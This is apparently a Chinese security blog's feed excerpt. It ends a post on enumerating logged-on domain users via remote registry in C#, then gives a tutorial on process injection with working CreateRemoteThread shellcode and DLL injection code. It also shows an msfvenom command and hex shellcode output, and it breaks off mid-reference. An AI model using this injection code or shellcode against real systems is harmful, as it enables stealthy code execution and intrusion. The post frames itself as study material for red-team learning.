id="3）、远程注册表"><a href="#3）、远程注册表" class="headerlink" title="3）、远程注册表"></a>3）、远程注册表</h3><p>此方法仅为辅助启用。尝试打开远程注册表的用户配置单元（如果已启用），并将查找与 SID 格式匹配的子项，这些对应于登录用户将获取的 SID 转换成用户名即可。一般来说，需要域管权限去操作，而在极少数情况下，无需管理员权限即可访问此数据，这个得看脸。</p><p>此处使用 <code>OpenRemoteBaseKey()</code> 函数。    </p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-20_11-44-13.png" alt=""></p><p>它需要 2 个参数：</p><ul><li><strong>RegistryHive：</strong>来自 <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryhive?view=netframework-4.8" target="_blank" rel="noopener">RegistryHive</a> 的枚举。这里选择 <code>Users</code>，表示 <code>HKEY_USERS</code>。</li><li><strong>string：</strong>表示远程主机。</li></ul><p>此函数的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server);</span><br></pre></td></tr></table></figure><p>它会返回如下内容：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">HKEY_USERS</span></span><br></pre></td></tr></table></figure><p>然后读取 <code>HKEY_USERS</code> 的键项就可以了。关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 利用 OpenRemoteBaseKey 读取 HKEY_USERS 的键项</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="keyword">string</span>&gt; <span class="title">GetRegistryLoggedOn</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> users = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;();</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 远程打开注册表配置单元，如果它不是我们当前的配置单元</span></span><br><span class="line">    RegistryKey key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到与我们的正则表达式匹配的所有子项</span></span><br><span class="line">    <span class="keyword">var</span> filtered = key.GetSubKeyNames().Where(sub =&gt; SidRegex.IsMatch(sub));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> subkey <span class="keyword">in</span> filtered)</span><br><span class="line">    &#123;</span><br><span class="line">      users.Add(subkey);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Exception)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="keyword">var</span> user <span class="keyword">in</span> users.Distinct())</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将 用户的SID 转成用户名即可。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> Username = <span class="keyword">new</span> SecurityIdentifier(regSID).Translate(<span class="keyword">typeof</span>(NTAccount)).ToString();</span><br></pre></td></tr></table></figure><h3 id="4）、结果"><a href="#4）、结果" class="headerlink" title="4）、结果"></a>4）、结果</h3><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-20_12-53-42.png" alt=""></p><h2 id="0x02-备忘录"><a href="#0x02-备忘录" class="headerlink" title="0x02 备忘录"></a>0x02 备忘录</h2><table><thead><tr><th style="text-align:left">API 调用</th><th style="text-align:center">协议</th><th style="text-align:center">端口</th><th style="text-align:left">RPC 接口 UUID</th><th style="text-align:left">命名管道</th><th style="text-align:left">RPC 方法</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb525382(v=vs.85" target="_blank" rel="noopener">NetSessionEnum</a>.aspx)</td><td style="text-align:center">[MS-SRVS]: Server Service Remote Protocol</td><td style="text-align:center">TCP 445</td><td style="text-align:left">4B324FC8-1670-01D3-1278-5A47BF6EE188</td><td style="text-align:left">\PIPE\srvsvc</td><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/cc247273.aspx" target="_blank" rel="noopener">NetrSessionEnum</a></td></tr><tr><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85" target="_blank" rel="noopener">NetWkstaUserEnum</a>.aspx)</td><td style="text-align:center">[MS-WKST]: Workstation Service Remote Protocol</td><td style="text-align:center">TCP 445</td><td style="text-align:left">6BFFD098-A112-3610-9833-46C3F87E345A</td><td style="text-align:left">\PIPE\wkssvc</td><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/cc250349.aspx" target="_blank" rel="noopener">NetrWkstaUserEnum</a></td></tr></tbody></table><p>Github 项目地址：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpDomainSession" target="_blank" rel="noopener">SharpDomainSession</a> ，此项目仅供实验使用 Demo。如想更进一步利用，可移至 <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">SharpHound</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2018 年3月，&lt;code&gt;BooldHound&lt;/code&gt; 发表了篇博文  &lt;a href=&quot;https://blog.cptjesus.com/posts/sharphoundtargeting&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SharpHound: Target Selection and API Usage&lt;/a&gt; 。这里面介绍了一些关于收集 &lt;code&gt;BooldHound&lt;/code&gt; 所需信息的收集方法及所使用的 &lt;code&gt;API&lt;/code&gt;。而本文主要介绍两个关于收集会话信息的 &lt;code&gt;API&lt;/code&gt;及利用远程注册表的方法（翻译+补充），也是对&lt;a href=&quot;https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/&quot;&gt;【域渗透】获取域环境内用户登录信息&lt;/a&gt; 的一个补充。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>进程注入-第一部分</title>
    <link href="https://rcoil.me/2019/09/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
    <id>https://rcoil.me/2019/09/进程注入-第一部分/</id>
    <published>2019-09-08T06:37:56.000Z</published>
    <updated>2019-09-11T02:04:19.243Z</updated>
    
    <content type="html"><![CDATA[<p>通过 <code>CreateRemoteThread</code> API 进行代码与 DLL 注入。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>某日看到收藏夹里头的 <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="noopener">Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques</a> ，里头总结得很到位，在国内的几个流行的安全媒体上也见过译文。</p><p>通过对进程注入技术的学习和理解，个人觉得整个过程非常有趣，故以此作为 <code>C#</code> 代码学习的方向（Windows API 利用），并编写有助于学习和开发的代码。</p><p><strong>注意： </strong>我不是第一个编写这样代码的人，Github 有一大堆代码示例。</p><h2 id="0x01-什么是进程注入"><a href="#0x01-什么是进程注入" class="headerlink" title="0x01 什么是进程注入"></a>0x01 什么是进程注入</h2><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。尽管有非常多的进程注入技术，本文所述是最常用的进程注入技术之一。</p><h2 id="0x02-VirtualAllocEx-gt-WriteProcessMemory-模式"><a href="#0x02-VirtualAllocEx-gt-WriteProcessMemory-模式" class="headerlink" title="0x02 VirtualAllocEx =&gt; WriteProcessMemory 模式"></a>0x02 <strong>VirtualAllocEx</strong> =&gt; <strong>WriteProcessMemory</strong> 模式</h2><p><code>CreateRemoteThread</code> 是 Win32 API 提供的一个函数，用于在另一个进程中创建线程。在另一个应用程序中创建线程之前，必须满足两个条件。</p><ul><li><p>尝试在另一个进程中创建线程的进程必须具有创建线程的权限。简单来说，必须有与目标进程相同或更高的权限（目标指的是我们想要创建线程的进程）</p></li><li><p>两个进程必须在同一会话中。如果会话标识符不匹配，则不会创建线程。</p></li></ul><p>如果不满足上述任何一个条件，则操作系统本身将拒绝代码注入这一过程。这不是 Windows 操作系统体系结构中的安全漏洞，而是由操作系统提供的功能。由于我们无法修改具有比我们更高权限的进程，因此不会跨越任何安全边界。</p><p>为了通过 <code>CreateRemoteThread</code> API 实现代码注入，我们遵循以下流程：</p><p><img src="/image/进程注入-第一部分/CreateRemoteThread 进程注入流程图.png" alt=""></p><p>代码示意：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">CodeInject</span>(<span class="params"><span class="keyword">int</span> pid, <span class="keyword">byte</span>[] buf</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint</span> lpNumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint</span> lpThreadId = <span class="number">0</span>;</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 获取进程ID <span class="subst">&#123;pid&#125;</span> 的句柄."</span>);</span><br><span class="line">        IntPtr pHandle = OpenProcess((<span class="keyword">uint</span>)ProcessAccessRights.All, <span class="literal">false</span>, (<span class="keyword">uint</span>)pid);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 打开进程id <span class="subst">&#123; pid &#125;</span> 的句柄 <span class="subst">&#123;pHandle&#125;</span>."</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 分配内存以注入shellcode."</span>);</span><br><span class="line">        IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (<span class="keyword">uint</span>)buf.Length, (<span class="keyword">uint</span>)MemAllocation.MEM_RESERVE | (<span class="keyword">uint</span>)MemAllocation.MEM_COMMIT, (<span class="keyword">uint</span>)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] Shellcode 的内存分配在 0x<span class="subst">&#123;rMemAddress&#125;</span>."</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 在已分配的内存位置写入shellcode"</span>);</span><br><span class="line">        <span class="keyword">if</span> (WriteProcessMemory(pHandle, rMemAddress, buf, (<span class="keyword">uint</span>)buf.Length, <span class="keyword">ref</span> lpNumberOfBytesWritten))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [&gt;] Shellcode写在进程内存中."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [&gt;] 创建远程线程来注入 shellcode."</span>);</span><br><span class="line">            IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, <span class="number">0</span>, rMemAddress, IntPtr.Zero, <span class="number">0</span>, <span class="keyword">ref</span> lpThreadId);</span><br><span class="line">            <span class="keyword">bool</span> hCreateRemoteThreadClose = CloseHandle(hRemoteThread);</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [&gt;] 成功将 shellcode 注入进程id <span class="subst">&#123;pid&#125;</span> 的内存中."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [!] 无法将shellcode注入进程id <span class="subst">&#123;pid&#125;</span> 的内存中."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> hOpenProcessClose = CloseHandle(pHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"[+] "</span> + Marshal.GetExceptionCode());</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cobalt Strike</code> 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。</p><p>当然，一个好的实现需要考虑到出现不同的极端情况，比如 x86 -&gt; x64， x64 -&gt; x86，不同上下文等，不过这不是本文的内容。</p><h2 id="0x03-深入了解函数"><a href="#0x03-深入了解函数" class="headerlink" title="0x03 深入了解函数"></a>0x03 深入了解函数</h2><h3 id="3-1-访问远程进程"><a href="#3-1-访问远程进程" class="headerlink" title="3.1 访问远程进程"></a>3.1 访问远程进程</h3><p>要对任何进程执行内存操作，我们必须能够访问到它。可以通过使用 <code>OpenProcess</code> 函数获得，该函数原型是：</p><p><img src="/image/进程注入-第一部分/blog_2019-09-02_15-56-38.png" alt=""></p><p>它需要 3 个参数：</p><ul><li><p><strong>DwDesiredAccess：</strong>对进程对象的请求访问权限。它将根据受害者进程的安全描述符进行检查。如果调用者启用了 <code>SeDebugPrivilege</code> 特权，则无论安全描述符的内容如何，都会授予所请求的访问权限。</p></li><li><p><strong>bInheritHandle：</strong>如果此值为 TRUE，则此进程创建的进程将继承该句柄。否则，进程不会继承此句柄。</p></li><li><strong>dwProcessId：</strong>这是受害者进程的进程标识符。</li></ul><p>如果函数成功，则返回值是指定进程的打开句柄，其他 API函数可以使用它来操作受害进程的内存。失败时，返回 NULL。</p><h3 id="3-2-为-shellcode-分配空间"><a href="#3-2-为-shellcode-分配空间" class="headerlink" title="3.2 为 shellcode 分配空间"></a>3.2 为 shellcode 分配空间</h3><p>一旦我们获得进程的句柄，我们继续为内存中的 shellcode 分配空间。这是通过使用 <code>VirtualAllocEx</code> API 调用完成的。</p><p><img src="/image/进程注入-第一部分/blog_2019-09-02_16-10-46.png" alt=""></p><p>它需要 5 个参数：</p><ul><li><strong>hProcess：</strong>进程的句柄。该函数在此进程的虚拟地址空间内分配内存。句柄必须具有<strong>PROCESS_VM_OPERATION</strong>访问权限。</li><li><strong>lpAddress：</strong>指向受害者进程内存中指定地址的指针。如果参数指定为 NULL，则该函数回自动选择要分配的内存页面。</li><li><strong>dwSize：</strong>要分配的内存区域的大小，它以字节为单位。</li><li><strong>flAllocationType：</strong>指定要分配的内存类型。此参数必须包含以下值之一。：MEM_COMMIT、MEM_RESERVE、MEM_RESET、MEM_RESET_UNDO。</li><li><strong>flProtect：</strong>要分配的页面区域的内存保护。出于我们的目的，它将包含我们要执行的代码，并且我们希望它可读可写，我们将其设置为 PAGE_EXECUTE_READWRITE。</li></ul><p>该函数在成功时返回分配的基址，而失败时，返回 NULL。</p><p>此时我们已经成功设法在进程中分配可执行内存。</p><h3 id="3-3-在远程进程中写入-shellcode"><a href="#3-3-在远程进程中写入-shellcode" class="headerlink" title="3.3 在远程进程中写入 shellcode"></a>3.3 在远程进程中写入 shellcode</h3><p>现在，我们需要在分配的区域中写入 shellcode。为此，我们有一个名为 <code>WriteProcessMemory</code> 的函数。</p><p><code>WriteProcessMemory</code> 是一个函数，它将调用者的数据写入指定进程的内存区域。需要注意的时整个内存区域必须时可写的，否则函数会失败，这就是为什么我们要将内存分配为可写，并与可读和可执行文件一起分配。</p><p><img src="/image/进程注入-第一部分/blog_2019-09-02_16-33-57.png" alt=""></p><p>它需要 5 个参数。</p><ul><li><strong>hProcess：</strong>要修改的进程内存的句柄。句柄必须具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</li><li><strong>lpBaseAddress：</strong>指向写入数据的指定进程中的基址的指针（我们想要写入数据的地址）。在发生数据传输之前，系统会验证指定大小的基址和内存中的所有数据是否都可以进行写访问，如果无法访问，则该函数将失败。</li><li><strong>lpBuffer：</strong>指向缓冲区的指针，指针补习时const指针。该缓冲区包含要在指定进程的地址空间中写入的数据。</li><li><strong>nSize：</strong>要写入指定进程的字节数。</li><li><strong>lpNumberOfBytesWritten：</strong>指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 <em>lpNumberOfBytesWritten</em> 为 <strong>NULL</strong>，则忽略该参数。</li></ul><p>如果函数由于某些原因而失败，则返回 false，如果成功则返回 true。</p><p>此时，stage 已全部设置，所需的只是在远程进程中创建一个线程并运行它。</p><h3 id="3-4-执行-shellcode"><a href="#3-4-执行-shellcode" class="headerlink" title="3.4 执行 shellcode"></a>3.4 执行 shellcode</h3><p>为了在远程进程中创建线程，我们使用 Win32 API 提供的 <code>CreateRemoteThread</code> 函数。</p><p><img src="/image/进程注入-第一部分/blog_2019-09-02_17-10-28.png" alt=""></p><p>它需要 7 个参数，其中只有 3 个是我们感兴趣的。其余的可以通过调整它们获得默认值，可以对新创建的线程进行更多控制。</p><p>我们感兴趣的参数是：</p><ul><li><strong>hProcess：</strong>要创建线程的进程的句柄。</li><li><strong>lpStartAddress：</strong>它是指向 <em>THREADSTARTROUTINE</em> 的指针，THREADSTARTROUTINE 是线程创建后开始执行代码的位置。</li><li><strong>lpParameter：</strong>指向 <em>LPTHREAD_START_ROUTINE</em> 所需参数的指针。因为在这种情况下，它是一个普通的shellcode，它不期望任何参数，因此，我们将它保持为 NULL 。此参数在 DLL 注入中具有价值。</li></ul><h2 id="0x04-演示"><a href="#0x04-演示" class="headerlink" title="0x04 演示"></a>0x04 演示</h2><p>利用 msfvenom 生成 shellcode</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rcoil@MacBookPro  ~  msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">Found 3 compatible encoders</span><br><span class="line">Attempting to encode payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> generic/<span class="keyword">none</span></span><br><span class="line">generic/<span class="keyword">none</span> <span class="keyword">failed</span> <span class="keyword">with</span> <span class="keyword">Encoding</span> <span class="keyword">failed</span> due <span class="keyword">to</span> a bad <span class="built_in">character</span> (<span class="keyword">index</span>=<span class="number">7</span>, <span class="built_in">char</span>=<span class="number">0x00</span>)</span><br><span class="line">Attempting <span class="keyword">to</span> <span class="keyword">encode</span> payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> x64/<span class="keyword">xor</span></span><br><span class="line">x64/<span class="keyword">xor</span> succeeded <span class="keyword">with</span> <span class="keyword">size</span> <span class="number">311</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x64/<span class="keyword">xor</span> chosen <span class="keyword">with</span> <span class="keyword">final</span> <span class="keyword">size</span> <span class="number">311</span></span><br><span class="line">Payload <span class="keyword">size</span>: <span class="number">311</span> <span class="keyword">bytes</span></span><br><span class="line"><span class="keyword">Final</span> <span class="keyword">size</span> <span class="keyword">of</span> <span class="keyword">hex</span> <span class="keyword">file</span>: <span class="number">622</span> <span class="keyword">bytes</span></span><br><span class="line"><span class="number">4831</span>c94881e9deffffff488d05efffffff48bbc690bbfdf6dbd2a448315827482df8ffffffe2f43ad83819063312a4c690faacb78b80f590d88a2f939359f6a6d830afee9359f6e6d8308fa693dd138cdaf6cc3f93e3646aacda81f4f7f2e50759b6bcf71a304994d1eab57d89f22f84acf3fc2650522cc690bbb5731ba6c38e916bad7d93cae04dd09bb4f70b31f28e6f72bc7def5aecc746f6cc3f93e3646ad17a34fb9ad365fe70ce0cbad89e80ced5822c83038ae04dd09fb4f70bb4e54d9cf3b97d9bceedc740fa76f2539aa516d1e3bcae858bfe87c8faa4b7819a272ab0faaf093b8ae59fcaf376e432855b396fe6b54cdad2a4c690bbfdf6935f29c791bbfdb761e32fa91744284d3bcf8eccd1015b63664f5b13d83839dee7d4d8cc10401d83de69e3d5e2d497f682932d1c6f6e9e97b7b1a4</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/image/进程注入-第一部分/blog_2019-09-02_18-02-31.png" alt=""></p><h2 id="0x05-DLL-注入"><a href="#0x05-DLL-注入" class="headerlink" title="0x05 DLL 注入"></a>0x05 DLL 注入</h2><h3 id="5-1-什么是DLL？"><a href="#5-1-什么是DLL？" class="headerlink" title="5.1 什么是DLL？"></a>5.1 什么是DLL？</h3><p>动态链接库（DLL）是一个包含代码的文件，程序已加载该文件以在运行时执行一个或多个操作。</p><h3 id="5-2-什么是DLL注入？"><a href="#5-2-什么是DLL注入？" class="headerlink" title="5.2 什么是DLL注入？"></a>5.2 什么是DLL注入？</h3><p>DLL 注入是一个将 DLL 注入到正在运行中的进程的过程，该进程可能包含恶意代码，可用于执行恶意活动。</p><h3 id="5-3-相关函数"><a href="#5-3-相关函数" class="headerlink" title="5.3 相关函数"></a>5.3 相关函数</h3><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank" rel="noopener">GetModuleHandleA</a> ：检索已由调用进程加载的指定模块的模块句柄。</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank" rel="noopener">GetProcAddress</a> ：从指定的动态链接库（DLL）中检索导出的函数或变量的地址。</li></ul><h3 id="5-4-示例代码"><a href="#5-4-示例代码" class="headerlink" title="5.4 示例代码"></a>5.4 示例代码</h3><p>DLL 注入，只需要在上面的基础上引入 <code>LoadLibrary</code> 即可。</p><p>代码部分只需要修改以下内容即可</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DLLInject</span>(<span class="params"><span class="keyword">int</span> pid, <span class="keyword">byte</span>[] buf</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint</span> lpNumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint</span> lpThreadId = <span class="number">0</span>;</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 获取进程ID <span class="subst">&#123;pid&#125;</span> 的句柄."</span>);</span><br><span class="line">        IntPtr pHandle = OpenProcess((<span class="keyword">uint</span>)ProcessAccessRights.All, <span class="literal">false</span>, (<span class="keyword">uint</span>)pid);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 打开进程id <span class="subst">&#123; pid &#125;</span> 的句柄 <span class="subst">&#123;pHandle&#125;</span>."</span>);</span><br><span class="line">        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] LoadLibraryA 的导出函数地址是 <span class="subst">&#123;loadLibraryAddr&#125;</span> ."</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 分配 DLL 路径的内存."</span>);</span><br><span class="line">        IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (<span class="keyword">uint</span>)buf.Length, (<span class="keyword">uint</span>)MemAllocation.MEM_RESERVE | (<span class="keyword">uint</span>)MemAllocation.MEM_COMMIT, (<span class="keyword">uint</span>)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 注入 DLL 路径的内存分配在 0x<span class="subst">&#123;rMemAddress&#125;</span>."</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">$"  [&gt;] 在已分配的内存位置写入 DLL 路径."</span>);</span><br><span class="line">        <span class="keyword">if</span> (WriteProcessMemory(pHandle, rMemAddress, buf, (<span class="keyword">uint</span>)buf.Length, <span class="keyword">ref</span> lpNumberOfBytesWritten))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [&gt;] DLL 路径写在目标进程内存中."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [&gt;] 创建远程线程来注入 DLL."</span>);</span><br><span class="line">            IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, <span class="number">0</span>, loadLibraryAddr, rMemAddress, <span class="number">0</span>, <span class="keyword">ref</span> lpThreadId);</span><br><span class="line">            <span class="keyword">bool</span> hCreateRemoteThreadClose = CloseHandle(hRemoteThread);</span><br><span class="line">            Console.WriteLine(<span class="string">$"[&gt;] 成功将 DLL 注入进程id <span class="subst">&#123;pid&#125;</span> 的内存中."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$"  [!] 无法将 DLL 注入进程id <span class="subst">&#123;pid&#125;</span> 的内存中."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> hOpenProcessClose = CloseHandle(pHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"[+] "</span> + Marshal.GetExceptionCode());</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-来源参考"><a href="#0x06-来源参考" class="headerlink" title="0x06 来源参考"></a>0x06 来源参考</h2><p><a href="https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html" target="_blank" rel="noopener">https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html</a><br><a 